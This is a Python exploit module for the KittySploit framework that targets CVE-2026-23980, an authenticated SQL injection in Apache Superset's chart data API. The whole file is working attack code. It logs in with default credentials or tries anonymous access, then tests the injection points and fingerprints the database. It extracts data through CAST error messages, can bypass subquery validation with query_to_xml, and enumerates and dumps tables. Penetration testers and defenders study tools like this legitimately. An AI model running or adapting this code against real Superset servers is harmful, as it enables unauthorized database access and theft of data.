#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-23980 — Apache Superset authenticated chart/data SQL injection."""

import json
import re
from typing import List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Apache Superset CVE-2026-23980 chart/data SQLi",
        "description": (
            "Exploits CVE-2026-23980: authenticated (or PUBLIC_ROLE) error-based SQL "
            "injection via sqlExpression/where on POST /api/v1/chart/data. Supports "
            "direct extraction, CAST error leakage, and PostgreSQL query_to_xml bypass. "
            "Affected: Superset < 6.0.0."
        ),
        "author": ["oscar-mine", "KittySploit Team"],
        "cve": ["CVE-2026-23980"],
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-23980",
            "https://github.com/advisories/GHSA-gvxg-9hqx-f4rg",
            "https://github.com/oscar-mine/CVE-2026-23980-Exploit",
        ],
        "tags": [
            "superset",
            "apache",
            "sqli",
            "authenticated",
            "postgresql",
            "cve-2026-23980",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "data_exfiltration"],
            "expected_requests": 10,
            "reversible": True,
            "approval_required": True,
            "produces": ["credentials", "risk_signals", "exploit_paths"],
            "cost": 1.2,
            "noise": 0.4,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["superset", "apache"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/api/v1/chart/data"],
                "param_any": ["sqlExpression"],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "db_access", "from_detail": "sqli"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(8088, "Superset HTTP port (default 8088)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    username = OptString("admin", "Superset username", required=False)
    password = OptString("admin", "Superset password", required=False)
    anonymous = OptBool(False, "Try PUBLIC_ROLE anonymous access first", required=False)
    action = OptString(
        "test",
        "Action: check | test | sql | banner | current_user | current_db | tables | columns | dump",
        required=False,
    )
    sql = OptString(
        "SELECT version()",
        "SQL expression/query for action=sql (scalar SELECT preferred)",
        required=False,
    )
    ds_id = OptInteger(0, "Dataset/datasource ID (0 = auto first dataset)", required=False)
    injection_point = OptString(
        "sqlExpression",
        "Injection point: sqlExpression | where",
        required=False,
    )
    xml_bypass = OptBool(
        False,
        "Wrap subquery in PostgreSQL query_to_xml() to bypass validate_adhoc_subquery",
        required=False,
    )
    target_table = OptString("", "Table name for columns/dump", required=False)
    target_columns = OptString(
        "",
        "Comma-separated columns for dump (empty = auto via API/info schema)",
        required=False,
    )
    row_start = OptInteger(0, "Dump start offset", required=False, advanced=True)
    row_stop = OptInteger(20, "Dump stop offset (exclusive)", required=False, advanced=True)
    db_type = OptString(
        "auto",
        "Backend hint: auto | sqlite | postgresql | mysql",
        required=False,
        advanced=True,
    )

    def __init__(self, framework=None):
        super().__init__(framework)
        self._auth_headers = {}
        self._datasources: List[dict] = []

    def _timeout(self) -> int:
        return max(int(self.timeout or 20), 10)

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _headers(self) -> dict:
        return dict(self._auth_headers)

    def _get_version(self) -> str:
        for path in ("/api/v1/version", "/health"):
            response = self.http_request(
                method="GET",
                path=path,
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response or response.status_code != 200:
                continue
            try:
                data = response.json() or {}
            except Exception:
                data = {}
            result = data.get("result") if isinstance(data.get("result"), dict) else {}
            for key in ("version", "VERSION_STRING"):
                if data.get(key):
                    return str(data[key])
                if result.get(key):
                    return str(result[key])
            match = re.search(r'"version"\s*:\s*"([^"]+)"', response.text or "")
            if match:
                return match.group(1)
        return ""

    @staticmethod
    def _is_vulnerable_version(version: str) -> bool:
        try:
            major = int(str(version).split(".")[0])
            return major < 6
        except Exception:
            return False

    def _set_csrf_from_response(self, response) -> None:
        if not response or response.status_code != 200:
            return
        try:
            csrf = (response.json() or {}).get("result")
        except Exception:
            csrf = None
        if csrf:
            self._auth_headers["X-CSRFToken"] = str(csrf)

    def _login(self) -> bool:
        username = self._opt(self.username) or "admin"
        password = self._opt(self.password)
        response = self.http_request(
            method="POST",
            path="/api/v1/security/login",
            json={
                "username": username,
                "password": password,
                "provider": "db",
                "refresh": True,
            },
            timeout=self._timeout(),
        )
        if not response or response.status_code != 200:
            return False
        try:
            token = (response.json() or {}).get("access_token")
        except Exception:
            token = None
        if not token:
            return False
        self._auth_headers["Authorization"] = f"Bearer {token}"
        csrf = self.http_request(
            method="GET",
            path="/api/v1/security/csrf_token/",
            headers=self._headers(),
            timeout=self._timeout(),
        )
        self._set_csrf_from_response(csrf)
        return True

    def _try_anonymous(self) -> bool:
        self.http_request(method="GET", path="/", timeout=self._timeout(), allow_redirects=True)
        csrf = self.http_request(
            method="GET",
            path="/api/v1/security/csrf_token/",
            timeout=self._timeout(),
        )
        self._set_csrf_from_response(csrf)

        body = self._chart_payload(1, "1", "sqlExpression")
        response = self.http_request(
            method="POST",
            path="/api/v1/chart/data",
            json=body,
            headers=self._headers(),
            timeout=self._timeout(),
        )
        return bool(response and response.status_code in (200, 400, 422, 500))

    def _enumerate_datasources(self) -> List[dict]:
        response = self.http_request(
            method="GET",
            path="/api/v1/dataset/",
            params={"q": "(page_size:50)"},
            headers=self._headers(),
            timeout=self._timeout(),
        )
        out = []
        if not response or response.status_code != 200:
            return out
        try:
            rows = (response.json() or {}).get("result") or []
        except Exception:
            return out
        for ds in rows:
            if not isinstance(ds, dict):
                continue
            database = ds.get("database") if isinstance(ds.get("database"), dict) else {}
            out.append(
                {
                    "id": ds.get("id"),
                    "name": ds.get("table_name") or ds.get("datasource_name"),
                    "database": database.get("database_name", "?"),
                    "type": ds.get("datasource_type", "table"),
                }
            )
        self._datasources = out
        return out

    def _resolve_ds_id(self) -> Optional[int]:
        configured = int(self.ds_id or 0)
        if configured > 0:
            return configured
        if self._datasources:
            return int(self._datasources[0]["id"])
        return None

    def _chart_payload(
        self,
        ds_id: int,
        sqli: str,
        injection_point: str,
        datasource_type: str = "table",
    ) -> dict:
        if injection_point == "where":
            return {
                "datasource": {"id": ds_id, "type": datasource_type},
                "queries": [
                    {
                        "columns": [],
                        "metrics": [
                            {
                                "label": "cnt",
                                "expressionType": "SQL",
                                "sqlExpression": "COUNT(*)",
                            }
                        ],
                        "filters": [],
                        "extras": {"having": "", "where": sqli},
                        "row_limit": 1,
                        "order_desc": True,
                        "time_range": "No filter",
                    }
                ],
                "result_format": "json",
                "result_type": "full",
            }
        return {
            "datasource": {"id": ds_id, "type": datasource_type},
            "queries": [
                {
                    "columns": [
                        {
                            "label": "injected",
                            "sqlExpression": sqli,
                            "expressionType": "SQL",
                        }
                    ],
                    "metrics": [],
                    "filters": [],
                    "extras": {"having": "", "where": ""},
                    "row_limit": 1000,
                    "order_desc": True,
                    "time_range": "No filter",
                }
            ],
            "result_format": "json",
            "result_type": "full",
        }

    def _send_sqli(self, ds_id: int, sqli: str, injection_point: str) -> Tuple[int, str]:
        body = self._chart_payload(ds_id, sqli, injection_point)
        response = self.http_request(
            method="POST",
            path="/api/v1/chart/data",
            json=body,
            headers=self._headers(),
            timeout=self._timeout(),
        )
        if not response:
            return 0, ""
        return response.status_code, response.text or ""

    @staticmethod
    def _extract_direct(text: str) -> Optional[str]:
        try:
            data = json.loads(text)
            rows = (data.get("result") or [{}])[0].get("data") or []
            if rows and isinstance(rows[0], dict) and rows[0].get("injected") is not None:
                return str(rows[0]["injected"])
        except Exception:
            return None
        return None

    @staticmethod
    def _extract_error(text: str) -> Optional[str]:
        patterns = (
            r'invalid input syntax for (?:type )?integer: "([^"]*)"',
            r'"message":\s*".*?invalid input syntax.*?\\"([^\\]*)\\"',
        )
        for pattern in patterns:
            match = re.search(pattern, text or "")
            if match:
                return match.group(1)
        return None

    def _wrap_error_payload(self, sql: str, injection_point: str) -> str:
        if self.xml_bypass:
            inner = f"query_to_xml('{sql.replace(chr(39), chr(39)+chr(39))}', true, false, '')"
            payload = f"CAST(({inner})::text AS INT)"
        else:
            payload = f"CAST(({sql}) AS INT)"
        if injection_point == "where":
            return f"1=1 AND {payload} > 0"
        return payload

    def extract_value(self, ds_id: int, sql: str, injection_point: str) -> Optional[str]:
        if injection_point == "sqlExpression":
            _, text = self._send_sqli(ds_id, f"({sql})", injection_point)
            direct = self._extract_direct(text)
            if direct is not None:
                return direct
        payload = self._wrap_error_payload(sql, injection_point)
        _, text = self._send_sqli(ds_id, payload, injection_point)
        return self._extract_error(text)

    def extract_rows(
        self,
        ds_id: int,
        sql: str,
        injection_point: str,
        start: int = 0,
        stop: int = 50,
    ) -> List[str]:
        base = re.sub(r"\s+LIMIT\s+\d+", "", sql, flags=re.I)
        base = re.sub(r"\s+OFFSET\s+\d+", "", base, flags=re.I)
        rows = []
        for offset in range(start, stop):
            query = f"{base} LIMIT 1 OFFSET {offset}"
            value = self.extract_value(ds_id, query, injection_point)
            if value is None:
                break
            rows.append(value)
        return rows

    def test_injectable(self, ds_id: int) -> Optional[str]:
        marker = "sqli_test_xyzzy"
        for point in ("sqlExpression", "where"):
            if point == "sqlExpression":
                payload = f"CAST('{marker}' AS INT)"
            else:
                payload = f"1=1 AND CAST('{marker}' AS INT) > 0"
            _, text = self._send_sqli(ds_id, payload, point)
            if marker in text:
                return point
        return None

    def fingerprint_db(self, ds_id: int, injection_point: str) -> str:
        configured = self._opt(self.db_type).lower()
        if configured in ("sqlite", "postgresql", "mysql"):
            return configured

        probes = (
            ("sqlite", "SELECT sqlite_version()"),
            ("postgresql", "SELECT current_setting('server_version')"),
            ("mysql", "SELECT @@version"),
        )
        for name, query in probes:
            value = self.extract_value(ds_id, query, injection_point)
            if value and re.search(r"\d+\.\d+", value):
                return name
        return "unknown"

    def _auth(self) -> bool:
        if self.anonymous:
            print_status("Trying anonymous PUBLIC_ROLE access...")
            if self._try_anonymous():
                print_success("Anonymous chart/data access works")
                return True
            print_warning("Anonymous access denied; falling back to credentials")

        print_status(f"Authenticating as {self._opt(self.username) or 'admin'}...")
        if not self._login():
            print_error("Authentication failed")
            return False
        print_success("Authenticated")
        return True

    def run(self):
        action = self._opt(self.action).lower() or "test"
        print_status("CVE-2026-23980 — Apache Superset chart/data SQLi")
        print_info(f"Target: {self.target}:{int(self.port)} action={action}")

        version = self._get_version()
        if version:
            if self._is_vulnerable_version(version):
                print_warning(f"Superset {version} < 6.0.0 — potentially vulnerable")
            else:
                print_info(f"Superset {version} — likely patched (>= 6.0.0)")
        else:
            print_status("Version unknown")

        if not self._auth():
            return False

        datasets = self._enumerate_datasources()
        if datasets:
            print_success(f"{len(datasets)} datasource(s):")
            for ds in datasets[:15]:
                print_info(f"  id={ds['id']}  {ds['name']}  [{ds['database']}]")
        else:
            print_warning("No datasources listed (may still inject with --ds_id)")

        if action == "check":
            return True

        ds_id = self._resolve_ds_id()
        if ds_id is None:
            print_error("No dataset ID available (set ds_id)")
            return False
        print_status(f"Using datasource id={ds_id}")

        injection_point = self._opt(self.injection_point) or "sqlExpression"
        if action in (
            "test",
            "sql",
            "banner",
            "current_user",
            "current_db",
            "tables",
            "columns",
            "dump",
        ):
            found = self.test_injectable(ds_id)
            if not found:
                print_error("Injection test failed (marker not reflected)")
                return False
            injection_point = found
            print_success(f"Injectable via {injection_point}")
            if action == "test":
                return True

        db_type = "unknown"
        if action in ("banner", "current_user", "current_db", "tables", "columns", "dump"):
            db_type = self.fingerprint_db(ds_id, injection_point)
            print_info(f"Backend fingerprint: {db_type}")

        if action == "sql":
            query = self._opt(self.sql) or "SELECT version()"
            print_status(f"Extracting: {query}")
            value = self.extract_value(ds_id, query, injection_point)
            if value is None:
                print_error("No data extracted")
                return False
            print_success(f"Result: {value}")
            return True

        if action == "banner":
            queries = {
                "sqlite": "SELECT sqlite_version()",
                "postgresql": "SELECT current_setting('server_version')",
                "mysql": "SELECT @@version",
                "unknown": "SELECT sqlite_version()",
            }
            value = self.extract_value(
                ds_id, queries.get(db_type, queries["unknown"]), injection_point
            )
            if not value:
                print_error("Could not fetch banner")
                return False
            print_success(f"Banner: {value}")
            return True

        if action == "current_user":
            queries = {
                "sqlite": "SELECT 'sqlite_user'",
                "postgresql": "SELECT current_user",
                "mysql": "SELECT user()",
            }
            value = self.extract_value(
                ds_id,
                queries.get(db_type, "SELECT current_user"),
                injection_point,
            )
            if not value:
                print_error("Could not fetch current user")
                return False
            print_success(f"Current user: {value}")
            return True

        if action == "current_db":
            queries = {
                "sqlite": "SELECT 'main'",
                "postgresql": "SELECT current_database()",
                "mysql": "SELECT database()",
            }
            value = self.extract_value(
                ds_id,
                queries.get(db_type, "SELECT current_database()"),
                injection_point,
            )
            if not value:
                print_error("Could not fetch current database")
                return False
            print_success(f"Current database: {value}")
            return True

        if action == "tables":
            if db_type == "sqlite":
                sql = "SELECT name FROM sqlite_master WHERE type='table'"
            elif db_type == "mysql":
                sql = (
                    "SELECT table_name FROM information_schema.tables "
                    "WHERE table_schema=database()"
                )
            else:
                sql = (
                    "SELECT table_name FROM information_schema.tables "
                    "WHERE table_schema='public'"
                )
            rows = self.extract_rows(ds_id, sql, injection_point, 0, int(self.row_stop or 50))
            if not rows and datasets:
                print_warning("Subquery blocked — listing known datasources")
                if self.xml_bypass is False and db_type == "postgresql":
                    print_info("Hint: set xml_bypass true for query_to_xml bypass")
                rows = [str(ds["name"]) for ds in datasets if ds.get("name")]
            if not rows:
                print_error("Could not enumerate tables")
                return False
            print_success(f"Tables [{len(rows)}]:")
            for name in rows:
                print_info(f"  {name}")
            return True

        if action == "columns":
            table = self._opt(self.target_table)
            if not table:
                print_error("action=columns requires target_table")
                return False
            if db_type == "sqlite":
                sql = f"SELECT name FROM pragma_table_info('{table}')"
            elif db_type == "mysql":
                sql = (
                    "SELECT column_name FROM information_schema.columns "
                    f"WHERE table_schema=database() AND table_name='{table}'"
                )
            else:
                sql = (
                    "SELECT column_name FROM information_schema.columns "
                    f"WHERE table_schema='public' AND table_name='{table}'"
                )
            rows = self.extract_rows(ds_id, sql, injection_point, 0, int(self.row_stop or 50))
            if not rows:
                # API fallback
                match = next((d for d in datasets if d.get("name") == table), None)
                if match:
                    detail = self.http_request(
                        method="GET",
                        path=f"/api/v1/dataset/{match['id']}",
                        headers=self._headers(),
                        timeout=self._timeout(),
                    )
                    if detail and detail.status_code == 200:
                        try:
                            cols = (detail.json() or {}).get("result", {}).get("columns") or []
                            rows = [
                                c.get("column_name") or c.get("name", "?")
                                for c in cols
                                if isinstance(c, dict)
                            ]
                        except Exception:
                            rows = []
            if not rows:
                print_error(f"Could not enumerate columns for {table}")
                return False
            print_success(f"Columns in {table} [{len(rows)}]:")
            for name in rows:
                print_info(f"  {name}")
            return True

        if action == "dump":
            table = self._opt(self.target_table)
            if not table:
                print_error("action=dump requires target_table")
                return False
            cols_opt = self._opt(self.target_columns)
            if cols_opt:
                columns = [c.strip() for c in cols_opt.split(",") if c.strip()]
            else:
                # Reuse columns enumeration path lightly via direct multi-column read.
                columns = []
                match = next((d for d in datasets if d.get("name") == table), None)
                if match:
                    detail = self.http_request(
                        method="GET",
                        path=f"/api/v1/dataset/{match['id']}",
                        headers=self._headers(),
                        timeout=self._timeout(),
                    )
                    if detail and detail.status_code == 200:
                        try:
                            cols = (detail.json() or {}).get("result", {}).get("columns") or []
                            columns = [
                                c.get("column_name") or c.get("name")
                                for c in cols
                                if isinstance(c, dict)
                                and (c.get("column_name") or c.get("name"))
                            ][:10]
                        except Exception:
                            columns = []
            if not columns:
                print_error("No columns — set target_columns")
                return False

            start = max(0, int(self.row_start or 0))
            stop = max(start + 1, int(self.row_stop or 20))
            body = {
                "datasource": {"id": ds_id, "type": "table"},
                "queries": [
                    {
                        "columns": [
                            {
                                "label": col,
                                "sqlExpression": col,
                                "expressionType": "SQL",
                            }
                            for col in columns
                        ],
                        "metrics": [],
                        "filters": [],
                        "extras": {"having": "", "where": ""},
                        "row_limit": stop - start,
                        "row_offset": start,
                        "order_desc": False,
                        "time_range": "No filter",
                    }
                ],
                "result_format": "json",
                "result_type": "full",
            }
            response = self.http_request(
                method="POST",
                path="/api/v1/chart/data",
                json=body,
                headers=self._headers(),
                timeout=self._timeout(),
            )
            rows = []
            if response and response.status_code == 200:
                try:
                    data = (response.json() or {}).get("result", [{}])[0].get("data") or []
                    for row in data:
                        rows.append([str(row.get(col, "NULL")) for col in columns])
                except Exception:
                    rows = []
            if not rows:
                print_error(f"Could not dump {table}")
                return False
            print_success(f"Dumped {len(rows)} row(s) from {table}")
            print_info(" | ".join(columns))
            for row in rows:
                print_info(" | ".join(row))
            return True

        print_error(f"Unknown action: {action}")
        return False
